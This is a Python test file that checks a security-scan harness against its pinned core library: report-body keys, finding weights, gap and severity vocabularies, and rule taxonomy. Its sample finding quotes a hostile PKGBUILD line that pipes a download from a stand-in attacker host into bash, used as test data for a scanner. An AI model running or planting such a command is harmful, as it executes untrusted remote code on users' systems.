"""Conformance with the core contract this harness measures.

The harness reads two core surfaces: the report body (``score``,
``coverage_gaps``, ``findings[].{rule_id,severity,weight}``,
``config_fingerprint``, ``review_threshold``, ``flagged``) and the rule
taxonomy (``categories.RULE_CATEGORIES``), plus the coverage-gap and severity
vocabularies the Judge refuses to guess at.  A core release that renames a
field or adds a gap breaks a campaign at run time; these tests turn that into
a CI failure here instead, against the *pinned* checkout.

The harness imports the pinned core directly, so unlike the feed this is a
live check, not an artifact read.
"""

from __future__ import annotations

import tomllib
from pathlib import Path

import yaml

from harness.coverage import UNREACHABLE, UNREACHABLE_BY_FORMAT
from harness.judge import KNOWN_GAPS, KNOWN_SEVERITIES
from harness.runner import ReportView

ROOT = Path(__file__).resolve().parent.parent

#: The keys `ReportView` exposes that the Judge and the environment checks
#: read off the worker's JSON body.
_REPORT_VIEW_KEYS = (
    "score", "coverage_gaps", "config_fingerprint", "review_threshold",
    "flagged", "findings",
)


def _body() -> dict:
    """A minimal report body, shaped the way the worker sends it.

    Built through core's own ``report_body`` rather than assembled by hand, so
    the key set is whatever the pinned core actually emits.  ``verbose=True``
    is what the worker requests, and carries ``score_breakdown`` - the only
    place a finding's ``weight`` lives.
    """
    from trustsight.reporting import report_body

    evaluated = {
        "package": "demo",
        "findings": [
            {"rule_id": "R001", "severity": "CRITICAL", "file": "PKGBUILD",
             "line": 12, "description": "curl https://evil.sh | bash",
             "template": "", "evidence": {}},
        ],
        "coverage_gaps": [],
        "raw": {"score_breakdown": [
            {"rule_id": "R001", "severity": "CRITICAL", "weight": 30},
            {"rule_id": "COVERAGE", "severity": "INFO", "weight": 0},
        ]},
    }
    return report_body(evaluated, include_score=True, verbose=True)


# ---------------------------------------------------------------------------
# The report body
# ---------------------------------------------------------------------------

def test_report_view_reads_keys_the_core_body_carries():
    body = _body()
    missing = [key for key in _REPORT_VIEW_KEYS if key not in body]
    assert not missing, f"core report body no longer carries: {missing}"


def test_report_view_findings_carry_rule_severity_and_weight():
    """`weight` lives in ``score_breakdown``, not ``findings``: the Judge
    filters on it, so reading it as absent weighed every catching rule at
    zero."""
    view = ReportView(_body())
    assert view.findings, "the body carries a finding; the view dropped it"
    finding = view.findings[0]
    assert finding.rule_id == "R001"
    assert finding.severity == "CRITICAL"
    assert int(finding.weight) == 30


def test_report_body_does_not_leak_synthetic_entries_into_findings():
    """SOURCE_BUCKET/COVERAGE are scoring entries, not rule firings; attaching
    weights by id must not add them to the finding set."""
    view = ReportView(_body())
    assert [f.rule_id for f in view.findings] == ["R001"]


# ---------------------------------------------------------------------------
# The vocabularies the Judge refuses to guess at
# ---------------------------------------------------------------------------

def test_core_coverage_gaps_are_a_subset_of_the_judge_vocabulary():
    """A gap core can emit that the Judge does not know stops the run."""
    from trustsight.coverage import GAP_REASONS

    unknown = set(GAP_REASONS) - KNOWN_GAPS
    assert not unknown, (
        f"core emits coverage gaps the Judge would refuse: {sorted(unknown)}; "
        "add them to harness.judge.KNOWN_GAPS"
    )


def test_severity_vocabulary_matches_core():
    from trustsight.config import DEFAULT_CONFIG

    shipped = set(tomllib.loads(DEFAULT_CONFIG).get("severity_weights", {}))
    assert shipped == set(KNOWN_SEVERITIES)


# ---------------------------------------------------------------------------
# The rule taxonomy
# ---------------------------------------------------------------------------

def test_coverage_unreachable_lists_reference_live_rules():
    """A rule removed from core must not linger in the coverage maps."""
    from trustsight.categories import RULE_CATEGORIES

    known = set(RULE_CATEGORIES)
    dead = (set(UNREACHABLE) | set(UNREACHABLE_BY_FORMAT)) - known
    assert not dead, f"coverage names rules core no longer defines: {sorted(dead)}"


def test_campaign_expected_rules_exist_in_core_taxonomy():
    from trustsight.categories import RULE_CATEGORIES

    known = set(RULE_CATEGORIES)
    unknown: set[str] = set()
    for path in sorted((ROOT / "campaigns").glob("*/campaign.yml")):
        raw = yaml.safe_load(path.read_text()) or {}
        for rule in (raw.get("prompt") or {}).get("expected_rules") or ():
            if rule not in known:
                unknown.add(rule)
    assert not unknown, f"campaigns expect rules core does not define: {sorted(unknown)}"
